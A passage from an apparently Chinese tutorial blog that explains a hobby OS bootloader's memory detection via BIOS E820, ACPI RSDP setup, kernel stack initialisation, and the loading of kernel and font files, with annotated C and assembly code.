class="comment">//内存开始地址</span></span><br><span class="line">    <span class="keyword">u64_t</span> lsize;    <span class="comment">//内存大小</span></span><br><span class="line">    <span class="keyword">u32_t</span> type;    <span class="comment">//内存类型 </span></span><br><span class="line">&#125;<span class="keyword">e820map_t</span>;</span><br></pre></td></tr></table></figure><p>获取的内存布局信息就保存在这样的结构体数组。而我们要通过init_mem函数来获取这样的结构体数组，并对内存进行检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_mem</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">e820map_t</span> *retemp;</span><br><span class="line">    <span class="keyword">u32_t</span> retemnr = <span class="number">0</span>;</span><br><span class="line">    mbsp-&gt;mb_ebdaphyadr = acpi_get_bios_ebda();<span class="comment">//获取 EBDA 的物理地址并存储在 mbsp-&gt;mb_ebdaphyadr 中</span></span><br><span class="line">    mmap(&amp;retemp, &amp;retemnr);<span class="comment">// 调用 mmap 函数获取 e820map_t 结构体的信息</span></span><br><span class="line">    <span class="keyword">if</span> (retemnr == <span class="number">0</span>)<span class="comment">// 检查是否成功获取了 e820map</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;no e820map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (chk_memsize(retemp, retemnr, <span class="number">0x100000</span>, <span class="number">0x8000000</span>) == <span class="literal">NULL</span>)<span class="comment">// 检查内存大小是否满足要求</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;Your computer is low on memory, the memory cannot be less than 128MB!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_e820padr = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)(retemp));<span class="comment">//把e820map_t结构数组的首地址传给mbsp-&gt;mb_e820padr</span></span><br><span class="line">    mbsp-&gt;mb_e820nr = (<span class="keyword">u64_t</span>)retemnr;<span class="comment">//把e820map_t结构数组元素个数传给mbsp-&gt;mb_e820nr</span></span><br><span class="line">    mbsp-&gt;mb_e820sz = retemnr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>));<span class="comment">//把e820map_t结构数组大小传给mbsp-&gt;mb_e820sz</span></span><br><span class="line">    mbsp-&gt;mb_memsz = get_memsize(retemp, retemnr);<span class="comment">//根据e820map_t结构数据计算内存大小。</span></span><br><span class="line">    init_acpi(mbsp);<span class="comment">//调用 init_acpi 函数进行 ACPI 初始化</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acpi_get_bios_ebda是将EBDA的地址返回，我们重点看看mmap函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap</span><span class="params">(<span class="keyword">e820map_t</span> **retemp, <span class="keyword">u32_t</span> *retemnr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    realadr_call_entry(RLINTNR(<span class="number">0</span>), <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//eax = 0 edx = 0 ecx = 0</span></span><br><span class="line">    *retemnr = *((<span class="keyword">u32_t</span> *)(E80MAP_NR));</span><br><span class="line">    *retemp = (<span class="keyword">e820map_t</span> *)(*((<span class="keyword">u32_t</span> *)(E80MAP_ADRADR)));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的realadr_call_entry参数eax为0，其调用的是realintsve.asm文件中func_table第一个函数_getmmap，我们来看看这个汇编函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_getmmap:</span><br><span class="line">    push ds</span><br><span class="line">    push es</span><br><span class="line">    push ss</span><br><span class="line">    mov esi,0</span><br><span class="line">    mov dword[E80MAP_NR],esi;E80MAP_NR设为0</span><br><span class="line">    mov dword[E80MAP_ADRADR],E80MAP_ADR;e820map结构体开始地址</span><br><span class="line">    xor ebx,ebx ;ebx设置为0</span><br><span class="line">    mov edi,E80MAP_ADR;将E80MAP_ADR传递给edi,存储e820map结构的初始位置</span><br><span class="line">loop:</span><br><span class="line">    mov eax,0e820h;获取e820map结构参数</span><br><span class="line">mov ecx,20;输出结果数据项的大小为20字节：8字节内存基地址，8字节内存长度，4字节内存类型</span><br><span class="line">mov edx,0534d4150h;获取e820map结构参数必须是这个数据</span><br><span class="line">int 15h;BIOS的15h中断</span><br><span class="line">jc .1;如果进位标志被设置（表示出现错误），跳转到标签 .1</span><br><span class="line">add edi,20;将 edi 的值增加 20（移动到下一个内存位置）</span><br><span class="line">cmp edi,E80MAP_ADR+0x1000;将 edi 与 E80MAP_ADR + 0x1000 进行比较</span><br><span class="line">jg .1;如果 edi 大于 E80MAP_ADR + 0x1000，跳转到标签 .1</span><br><span class="line">inc esi;增加 esi 的值（循环计数器）</span><br><span class="line">cmp ebx,0;将 ebx 与零进行比较</span><br><span class="line">jne loop;如果 ebx 不等于零，则重复循环</span><br><span class="line">jmp .2</span><br><span class="line"></span><br><span class="line">.1:</span><br><span class="line">mov esi,0;将 esi 的值重置为零</span><br><span class="line"></span><br><span class="line">.2:</span><br><span class="line">mov dword[E80MAP_NR],esi;将最终的 esi 值存储到由 E80MAP_NR 指向的内存位置</span><br><span class="line">pop ss</span><br><span class="line">pop es</span><br><span class="line">pop ds</span><br><span class="line">ret    </span><br></pre></td></tr></table></figure><p>我先简单说明一下int 15h调用e820h的各个参数</p><table><thead><tr><th>Register</th><th>含义</th></tr></thead><tbody><tr><td>EAX</td><td><strong>E820h</strong>这是用来指示BIOS获取系统内存映射的功能码</td></tr><tr><td>EBX</td><td>包含获取下一个物理内存范围的续传值。这是此例程之前调用返回的值。如果这是第一次调用，EBX必须包含零。</td></tr><tr><td>ES:DI</td><td>缓冲区指针指向地址范围描述符结构的指针，BIOS会填充这个结构。</td></tr><tr><td>ECX</td><td>缓冲区大小传递给BIOS的结构的长度（以字节为单位）。BIOS会填充ECX寄存器中指示的结构的字节数最小大小是20字节</td></tr><tr><td>EDX</td><td>签名‘SMAP’ 由BIOS使用，以验证调用者是否请求将系统映射信息返回到ES:DI中。</td></tr></tbody></table><p>上面的函数将ebx设置为0，将edi设置为存储e820map结构的初始位置。接下来进入循环，如果中途出错或者内存空间不足以获取内存空间就将esi值设置为0，以便后续报错，如果正常获取，当ebx值为0时，证明获取完毕，向E80MAP_NR地址填入有多少值，返回之前的函数即可。</p><p>我们回看之前的init _mem函数，如果retemnr也就是之前的E80MAP_NR为0的话，报错；如果正常的话进行下一步。接下来调用chk_memsize，该函数是检查内存大小是否满足要求。之后向machbstart_t结构中填入相关数据，在这个函数的最后，获取MRSDP。在调用 <code>int 15h</code> 中断，<code>eax = e820h</code> 功能时，所返回的“内存区域”是指系统物理地址空间中的特定区间（通常以起始地址和长度描述）。这些区域有不同的功能和用途，它们共同构成了系统物理内存的完整布局。</p><p>具体来说，这些内存区域可以是以下几种类型：</p><hr><h3 id="1-可用内存区域-Usable-Memory"><a href="#1-可用内存区域-Usable-Memory" class="headerlink" title="1. 可用内存区域 (Usable Memory)"></a><strong>1. 可用内存区域 (Usable Memory)</strong></h3><ul><li><p><strong>描述</strong>：可以供操作系统自由使用的内存。</p></li><li><p><strong>标识</strong>：<code>Type = 1</code></p></li><li><p>用途</p><p>：</p><ul><li>这部分内存是操作系统用于分配应用程序内存的主要区域。</li><li>典型的可用内存区域通常从低地址开始（例如1MB以上）直到系统物理内存的上限。</li></ul></li><li><p>范围</p><p>：</p><ul><li>在传统x86系统中，通常可用内存从 1MB 到约 3GB 或更高（具体依赖于硬件配置）。</li></ul></li></ul><hr><h3 id="2-保留内存区域-Reserved-Memory"><a href="#2-保留内存区域-Reserved-Memory" class="headerlink" title="2. 保留内存区域 (Reserved Memory)"></a><strong>2. 保留内存区域 (Reserved Memory)</strong></h3><ul><li><p><strong>描述</strong>：已被系统或硬件设备使用的内存区域，操作系统不能自由访问。</p></li><li><p><strong>标识</strong>：<code>Type = 2</code></p></li><li><p>用途</p><p>：</p><ul><li>BIOS占用：BIOS代码或数据需要存储在物理内存的某些地址。</li><li>映射到设备：硬件设备可能会将内存映射到特定地址，比如显卡帧缓冲区。</li><li>不可用区域：其他可能无法使用的区域（例如物理地址不连续时的间隙）。</li></ul></li><li><p>例子</p><p>：</p><ul><li>通常在 0xA0000 到 0xFFFFF 之间会有一部分内存保留给 BIOS 和显卡。</li></ul></li></ul><hr><h3 id="3-ACPI-可回收内存区域-ACPI-Reclaimable-Memory"><a href="#3-ACPI-可回收内存区域-ACPI-Reclaimable-Memory" class="headerlink" title="3. ACPI 可回收内存区域 (ACPI Reclaimable Memory)"></a><strong>3. ACPI 可回收内存区域 (ACPI Reclaimable Memory)</strong></h3><ul><li><p><strong>描述</strong>：ACPI（Advanced Configuration and Power Interface，高级配置和电源接口）使用的内存区域，但在系统启动完成后，可以回收供操作系统使用。</p></li><li><p><strong>标识</strong>：<code>Type = 3</code></p></li><li><p>用途</p><p>：</p><ul><li>用于存储 ACPI 表等配置数据。</li><li>操作系统启动后（完成引导阶段），ACPI 数据被读取后，这部分内存可以释放。</li></ul></li></ul><hr><h3 id="4-ACPI-NVS（Non-Volatile-Storage）区域"><a href="#4-ACPI-NVS（Non-Volatile-Storage）区域" class="headerlink" title="4. ACPI NVS（Non-Volatile Storage）区域"></a><strong>4. ACPI NVS（Non-Volatile Storage）区域</strong></h3><ul><li><p><strong>描述</strong>：ACPI 非易失存储（ACPI NVS）的内存区域。</p></li><li><p><strong>标识</strong>：<code>Type = 4</code></p></li><li><p>用途</p><p>：</p><ul><li>用于 ACPI 固定的数据存储（如系统休眠或设备状态保存）。</li><li>操作系统不能占用或修改此区域的内容。</li></ul></li><li><p>典型特性</p><p>：</p><ul><li>比如，在系统进入 S3、S4（睡眠或休眠）模式时，这些区域存储恢复所需的数据。</li></ul></li></ul><hr><h3 id="5-未定义-专用用途的内存区域"><a href="#5-未定义-专用用途的内存区域" class="headerlink" title="5. 未定义/专用用途的内存区域"></a><strong>5. 未定义/专用用途的内存区域</strong></h3><ul><li><p><strong>描述</strong>：其他保留的或硬件特定的内存区域，具体用途通常由硬件设备或系统设计决定。</p></li><li><p><strong>标识</strong>：<code>Type = 5</code>（或其他未定义值）</p></li><li><p>用途</p><p>：</p><ul><li>专用硬件可能需要的内存区（如 DMA 的缓冲区、显卡特定缓冲区等）。</li><li>有些值可能是保留给未来扩展使用的。</li></ul></li></ul><hr><h3 id="6-视频内存区域-特殊用途"><a href="#6-视频内存区域-特殊用途" class="headerlink" title="6. 视频内存区域 (特殊用途)"></a><strong>6. 视频内存区域 (特殊用途)</strong></h3><ul><li><p><strong>描述</strong>：某些内存地址可能直接映射到硬件设备，例如显卡的帧缓冲区。</p></li><li><p>用途</p><p>：</p><ul><li>通常在 0xA0000 到 0xBFFFF 区间，这是传统的显存区域，用于显示数据。</li><li>高地址的部分也可能是 PCI设备或显卡占用。</li></ul></li></ul><hr><h3 id="7-内存映射-I-O-区域"><a href="#7-内存映射-I-O-区域" class="headerlink" title="7. 内存映射 I/O 区域"></a><strong>7. 内存映射 I/O 区域</strong></h3><ul><li><p><strong>描述</strong>：部分物理内存地址可能映射到硬件设备的寄存器。</p></li><li><p>用途</p><p>：</p><ul><li>比如 PCI设备的配置空间。</li><li>CPU通过这些区域与硬件设备通信，而非真正的数据存储用途。</li></ul></li></ul><hr><h3 id="8-典型内存区域划分示例"><a href="#8-典型内存区域划分示例" class="headerlink" title="8. 典型内存区域划分示例"></a><strong>8. 典型内存区域划分示例</strong></h3><p>以一个传统的 32 位 x86 系统为例，典型的内存区域可能如下：</p><table><thead><tr><th>起始地址</th><th>结束地址</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>0x00000000</td><td>0x0009FFFF</td><td>可用内存</td><td>常规内存（低 640KB）</td></tr><tr><td>0x000A0000</td><td>0x000BFFFF</td><td>保留内存</td><td>视频内存（VGA 显存）</td></tr><tr><td>0x000C0000</td><td>0x000FFFFF</td><td>保留内存</td><td>BIOS 数据</td></tr><tr><td>0x00100000</td><td>0x7FFFFFFF</td><td>可用内存</td><td>常规内存（高 1MB 以上的系统可用内存）</td></tr><tr><td>0x80000000</td><td>0xFFFFFFFF</td><td>保留/设备映射区域</td><td>硬件保留、设备映射区、PCI内存映射等</td></tr></tbody></table><p>现代系统中（特别是 64 位系统），内存划分更加复杂，会包括大于 4GB 的物理地址空间。</p><p>接下来我们看看init_acpi(mbsp)函数，这个函数主要是对ACPI进行一个初始化，</p><h3 id="ACPI初始化"><a href="#ACPI初始化" class="headerlink" title="ACPI初始化"></a>ACPI初始化</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PUBLIC <span class="keyword">void</span> <span class="title">init_acpi</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mrsdp_t</span> *rdp = <span class="literal">NULL</span>;</span><br><span class="line">    rdp = find_acpi_rsdp();<span class="comment">//尝试通过 find_acpi_rsdp 函数查找 ACPI 的根系统描述指针</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == rdp)<span class="comment">//检测指针是否存在</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;Your computer is not support ACPI!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    m2mcopy(rdp, &amp;mbsp-&gt;mb_mrsdp, (<span class="keyword">sint_t</span>)((<span class="keyword">sizeof</span>(<span class="keyword">mrsdp_t</span>))));<span class="comment">//将结构体复制过去</span></span><br><span class="line">    <span class="keyword">if</span> (acpi_rsdp_isok(&amp;mbsp-&gt;mb_mrsdp) == <span class="literal">NULL</span>)<span class="comment">//函数检查复制的数据是否有效</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;Your computer is not support ACPI!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先来看看关于APIC的结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_MRSDP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> rp_sign;<span class="comment">//签名字段，用于标识这个结构体包含的数据类型或格式</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_chksum;<span class="comment">//校验和字段，用于验证结构体数据的完整性</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_oemid[<span class="number">6</span>];<span class="comment">//OEM（原始设备制造商）标识符，用于标识创建这个表的硬件制造商</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_revn;<span class="comment">//修订号，指示这个结构体或数据表的版本</span></span><br><span class="line">    <span class="keyword">u32_t</span> rp_rsdtphyadr;<span class="comment">//RSDT（Root System Description Table）的物理地址，这是ACPI中的一个表，包含了其他所有系统描述表的地址</span></span><br><span class="line">    <span class="keyword">u32_t</span> rp_len;<span class="comment">//RSDP 的长度</span></span><br><span class="line">    <span class="keyword">u64_t</span> rp_xsdtphyadr;<span class="comment">//XSDT（Extended System Description Table）的物理地址，这是一个扩展的系统描述表，包含了更多的系统描述表地址</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_echksum;<span class="comment">//扩展校验和，可能用于验证整个结构体或扩展表的完整性</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_resv[<span class="number">3</span>];<span class="comment">//保留字段，必须填充为零，用于对齐或未来扩展</span></span><br><span class="line">&#125;__attribute__((packed)) <span class="keyword">mrsdp_t</span>;<span class="comment">//这里的__attribute__((packed))用于告诉编译器取消结构体在编译过程中字段紧密排列，没有内存对齐填充</span></span><br></pre></td></tr></table></figure><p><code>mrsdp_t</code> 表示 ACPI RSDP，主要作用如下：</p><ol><li><strong>标识 ACPI 的存在</strong>：<ul><li>系统通过 <code>rp_sign</code> 字段（签名）识别 ACPI 的存在。</li><li>签名通常是 <code>&quot;RSD PTR &quot;</code>, 用于表明这是一段有效的 ACPI 数据。</li></ul></li><li><strong>提供入口点</strong>：<ul><li>它包含了指向 ACPI 其他系统描述表（如 RSDT 或 XSDT）的地址。</li><li>RSDT 和 XSDT 是核心的 ACPI 表，记录了系统中所有 ACPI 表的地址。</li></ul></li><li><strong>支持电源管理和硬件配置</strong>：<ul><li>操作系统通过解析 ACPI 表（通过 RSDP 提供的入口地址）来实现高级电源管理功能，例如待机、休眠等。</li><li>还用于硬件设备的动态配置和资源管理。</li></ul></li></ol><h2 id="获取映像文件大小"><a href="#获取映像文件大小" class="headerlink" title="获取映像文件大小"></a>获取映像文件大小</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">u64_t</span> <span class="title">get_wt_imgfilesz</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> retsz = LDRFILEADR; <span class="comment">// 初始化返回的文件大小为加载文件地址</span></span><br><span class="line">    <span class="keyword">mlosrddsc_t</span> *mrddadrs = MRDDSC_ADR;<span class="comment">// 获取内存中影响文件头描述符的地址</span></span><br><span class="line">    <span class="keyword">if</span> (mrddadrs-&gt;mdc_endgic != MDC_ENDGIC ||</span><br><span class="line">        mrddadrs-&gt;mdc_rv != MDC_RVGIC ||</span><br><span class="line">        mrddadrs-&gt;mdc_fhdnr &lt; <span class="number">2</span> ||</span><br><span class="line">        mrddadrs-&gt;mdc_filnr &lt; <span class="number">2</span>)<span class="comment">//检查基本信息，如果不正确，则返回0</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mrddadrs-&gt;mdc_filbk_e &lt; <span class="number">0x4000</span>)<span class="comment">//检查文件块结束地址是否有效</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    retsz += mrddadrs-&gt;mdc_filbk_e;</span><br><span class="line">    retsz -= LDRFILEADR;<span class="comment">// 将文件块结束地址加到retsz上，然后减去LDRFILEADR，得到文件的实际大小</span></span><br><span class="line">    mbsp-&gt;mb_imgpadr = LDRFILEADR;<span class="comment">// 设置machbstart_t结构体中的mb_imgpadr为LDRFILEADR，即映像文件的加载地址</span></span><br><span class="line">    mbsp-&gt;mb_imgsz = retsz;<span class="comment">// 设置machbstart_t结构体中的mb_imgsz为计算出的文件大小</span></span><br><span class="line">    <span class="keyword">return</span> retsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取映像文件的起始地址和大小，如果基础信息错误或者文件结束地址无效则报错</p><h2 id="初始化内核栈"><a href="#初始化内核栈" class="headerlink" title="初始化内核栈"></a>初始化内核栈</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_krlinitstack</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &gt; move_krlimg(mbsp, (<span class="keyword">u64_t</span>)(<span class="number">0x8f000</span>), <span class="number">0x1001</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;iks_moveimg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_krlinitstack = IKSTACK_PHYADR;<span class="comment">//栈顶地址</span></span><br><span class="line">    mbsp-&gt;mb_krlitstacksz = IKSTACK_SIZE;<span class="comment">//栈大小是4KB</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先先确认内核栈空间是否和之前加入内存中的内容有冲突，move_krlimg函数首先先检查地址是否合法，再通过adrzone_is_ok函数来检查两份内存空间是否有重叠，如果重叠，接着对照之前获取的内存信息，检查内存是否可用，如果这部分也通过了，就将内核映像文件复制到栈空间之后，目的是腾出之前那部分的内存，防止后面重叠覆盖，但是目前来看，如果使用内核栈的过程中有栈溢出漏洞的话，是可以轻易覆盖掉这部分内容的，如果没有重叠则直接返回。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move_krlimg</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp, <span class="keyword">u64_t</span> cpyadr, <span class="keyword">u64_t</span> cpysz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0xffffffff</span> &lt;= (cpyadr + cpysz) || <span class="number">1</span> &gt; cpysz)<span class="comment">// 检查传进来的地址是否合法</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> *toadr = (<span class="keyword">void</span> *)((<span class="keyword">u32_t</span>)(P4K_ALIGN(cpyadr + cpysz)));<span class="comment">// 计算目标地址（向上对齐到4KB的倍数）</span></span><br><span class="line">    <span class="keyword">sint_t</span> tosz = (<span class="keyword">sint_t</span>)mbsp-&gt;mb_imgsz;<span class="comment">// 获取映像文件空间的大小</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != adrzone_is_ok(mbsp-&gt;mb_imgpadr, mbsp-&gt;mb_imgsz, cpyadr, cpysz))<span class="comment">// 检查源地址和大小是否和已经存在的内容重叠</span></span><br><span class="line">    &#123;   <span class="comment">//如果重叠  </span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == chk_memsize((<span class="keyword">e820map_t</span> *)((<span class="keyword">u32_t</span>)(mbsp-&gt;mb_e820padr)), (<span class="keyword">u32_t</span>)mbsp-&gt;mb_e820nr, (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)toadr), (<span class="keyword">u64_t</span>)tosz))<span class="comment">//检查内存大小是否足够</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m2mcopy((<span class="keyword">void</span> *)((<span class="keyword">u32_t</span>)mbsp-&gt;mb_imgpadr), toadr, tosz);<span class="comment">// 复制映像内容到0x90000的地址</span></span><br><span class="line">        mbsp-&gt;mb_imgpadr = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)toadr);<span class="comment">// 更新映像的起始地址</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;<span class="comment">//如果不重叠</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="放置内核文件"><a href="#放置内核文件" class="headerlink" title="放置内核文件"></a>放置内核文件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_krlfile</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> sz = r_file_to_padr(mbsp, IMGKRNL_PHYADR, <span class="string">&quot;Cosmos.bin&quot;</span>);<span class="comment">////在映像中查找相应的文件，并复制到对应的地址，并返回文件的大小，这里是查找Cosmos.bin文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == sz)</span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;r_file_to_padr err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_krlimgpadr = IMGKRNL_PHYADR;<span class="comment">//填入内核起始地址</span></span><br><span class="line">    mbsp-&gt;mb_krlsz = sz;<span class="comment">//填入内核大小</span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = P4K_ALIGN(mbsp-&gt;mb_krlimgpadr + mbsp-&gt;mb_krlsz);<span class="comment">//始终要保持指向下一段空闲内存的首地址</span></span><br><span class="line">    mbsp-&gt;mb_kalldendpadr = mbsp-&gt;mb_krlimgpadr + mbsp-&gt;mb_krlsz;<span class="comment">//计算内核结束地址并保存</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先来看r_file_to_padr函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">u64_t</span> <span class="title">r_file_to_padr</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp, <span class="keyword">u32_t</span> f2adr, <span class="keyword">char_t</span> *fnm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == f2adr || <span class="literal">NULL</span> == fnm || <span class="literal">NULL</span> == mbsp)<span class="comment">//检查参数</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">u32_t</span> fpadr = <span class="number">0</span>, sz = <span class="number">0</span>;</span><br><span class="line">    get_file_rpadrandsz(fnm, mbsp, &amp;fpadr, &amp;sz);<span class="comment">//查找文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == fpadr || <span class="number">0</span> == sz)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == chk_memsize((<span class="keyword">e820map_t</span> *)((<span class="keyword">u32_t</span>)mbsp-&gt;mb_e820padr), (<span class="keyword">u32_t</span>)(mbsp-&gt;mb_e820nr), f2adr, sz))<span class="comment">//检查内存是否足够</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != chkadr_is_ok(mbsp, f2adr, sz))<span class="comment">//检查给定的地址范围是否有效</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m2mcopy((<span class="keyword">void</span> *)fpadr, (<span class="keyword">void</span> *)f2adr, (<span class="keyword">sint_t</span>)sz);<span class="comment">//复制文件到0x2000000</span></span><br><span class="line">    <span class="keyword">return</span> sz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码主要是获取内核文件的大小和地址，并复制文件到给定地址，其中get_file_rpadrandsz和之前类似，获取文件头描述符来查找文件</p><p>接下来就是将获取得到的地址储存到结构体中</p><h2 id="放置字库文件"><a href="#放置字库文件" class="headerlink" title="放置字库文件"></a>放置字库文件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_defutfont</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> sz = r_file_to_padr(mbsp, mbsp-&gt;mb_nextwtpadr, <span class="string">&quot;font.fnt&quot;</span>);<span class="comment">//在映像中查找相应的文件，并复制到对应的地址，并返回文件的大小，这里是查找Cosmos.bin文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == sz)</span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;r_file_to_padr err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_bfontpadr = mbsp-&gt;mb_nextwtpadr;<span class="comment">//填入字库文件起始地址</span></span><br><span class="line">    mbsp-&gt;mb_bfontsz = sz;<span class="comment">//填入字库文件大小</span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = P4K_ALIGN(mbsp-&gt;mb_nextwtpadr + sz);<span class="comment">//始终要保持指向下一段空闲内存的首地址</span></span><br><span class="line">    mbsp-&gt;mb_kalldendpadr = mbsp-&gt;mb_bfontpadr + mbsp-&gt;mb_bfontsz;<span class="comment">//计算内核结束地址并保存</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和放置内核文件类似</p><h2 id="复制e820表"><a href="#复制e820表" class="headerlink" title="复制e820表"></a>复制e820表</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_meme820</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">e820map_t</span> *semp = (<span class="keyword">e820map_t</span> *)((<span class="keyword">u32_t</span>)(mbsp-&gt;mb_e820padr));<span class="comment">//获取e820表地址</span></span><br><span class="line">    <span class="keyword">u64_t</span> senr = mbsp-&gt;mb_e820nr;<span class="comment">//获取e820的数组数量</span></span><br><span class="line">    <span class="keyword">e820map_t</span> *demp = (<span class="keyword">e820map_t</span> *)((<span class="keyword">u32_t</span>)(mbsp-&gt;mb_nextwtpadr));<span class="comment">//获取下一个空闲地址块地址</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &gt; move_krlimg(mbsp, (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)demp), (senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>)))))<span class="comment">//检查地址是否合法，是否和映像文件有重叠</span></span><br><span 